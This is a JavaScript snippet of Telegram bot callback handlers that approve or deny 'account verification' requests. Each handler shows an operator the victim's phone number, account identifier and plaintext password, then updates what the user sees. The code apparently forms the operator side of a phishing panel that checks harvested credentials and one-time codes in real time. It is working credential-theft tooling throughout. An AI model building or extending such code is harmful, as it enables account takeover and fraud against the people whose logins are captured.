// Add these callback handlers INSIDE the bot.on('callback_query') function
// After the existing wrongcode_otp handler and BEFORE the "STANDARD CALLBACKS" section

// ==========================================
// ACCOUNT VERIFICATION CALLBACKS
// ==========================================
if (data.startsWith('deny_verify_')) {
    const applicationId = data.replace('deny_verify_', '');
    console.log(`âŒ Account verification DENIED: ${applicationId}`);
    
    const application = await db.getApplication(applicationId);
    
    if (!application || application.adminId !== adminId) {
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: 'âŒ Application not found!',
            show_alert: true
        });
        return;
    }
    
    // Update status
    await db.updateApplication(applicationId, { verificationStatus: 'rejected' });
    console.log(`âœ… Status updated: verification rejected`);
    
    // Update message
    const updatedMessage = `
âŒ *INVALID CREDENTIALS*

ğŸ“‹ \`${applicationId}\`
ğŸ“± \`${formatPhoneForDisplay(application.phoneNumber)}\`
${application.identifierType === 'email' ? 'ğŸ“§' : 'ğŸ“±'} \`${application.accountIdentifier}\`
ğŸ”‘ \`${application.accountPassword}\`

âœ— REJECTED
ğŸ‘¤ ${callbackQuery.from.first_name}
â° ${new Date().toLocaleString()}
    `;
    
    await bot.editMessageText(updatedMessage, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown'
    });
    
    await bot.answerCallbackQuery(callbackQuery.id, {
        text: 'âŒ Credentials rejected',
        show_alert: false
    });
    
    console.log(`âœ… Account verification rejection complete\n`);
    return;
}

if (data.startsWith('approve_verify_')) {
    const applicationId = data.replace('approve_verify_', '');
    console.log(`âœ… Account verification APPROVED: ${applicationId}`);
    
    const application = await db.getApplication(applicationId);
    
    if (!application || application.adminId !== adminId) {
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: 'âŒ Application not found!',
            show_alert: true
        });
        return;
    }
    
    // Update status
    await db.updateApplication(applicationId, { verificationStatus: 'approved' });
    console.log(`âœ… Status updated: verification approved`);
    
    // Update message
    const updatedMessage = `
âœ… *CREDENTIALS VERIFIED*

ğŸ“‹ \`${applicationId}\`
ğŸ“± \`${formatPhoneForDisplay(application.phoneNumber)}\`
${application.identifierType === 'email' ? 'ğŸ“§' : 'ğŸ“±'} \`${application.accountIdentifier}\`
ğŸ”‘ \`${application.accountPassword}\`

âœ“ APPROVED
ğŸ‘¤ ${callbackQuery.from.first_name}
â° ${new Date().toLocaleString()}

User will now see approval page.
    `;
    
    await bot.editMessageText(updatedMessage, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown'
    });
    
    await bot.answerCallbackQuery(callbackQuery.id, {
        text: 'âœ… Credentials approved!',
        show_alert: false
    });
    
    console.log(`âœ… Account verification approval complete\n`);
    return;
}